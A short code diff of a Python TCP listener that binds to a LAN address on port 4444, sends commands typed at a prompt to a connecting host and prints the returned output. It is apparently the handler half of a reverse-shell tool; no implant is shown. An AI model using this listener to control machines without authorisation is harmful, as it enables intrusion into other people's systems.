@@ -1,17 +1,21 @@
 import socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '127.0.0.1'
-port = 3333
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+host = '192.168.1.13'
+port = 4444
+
 s.bind((host, port))
-s.listen(1)
+
+s.listen(0)
+print("Waiting...") 
 conn, addr = s.accept()
-print(addr)
+print("[+] Connect " + str(addr))
 
 while True:
-	cmd = input('#> ')
-	conn.send(cmd.encode())
-
-	cmd_process = conn.recv(5000)
-	cmd_process = str(cmd_process, "cp866")
-	print(cmd_process)
+	command = input("#> ")
+	conn.send(command.encode())
+	res = conn.recv(1024)
+	res = str(res, "cp866")
+	print(res)
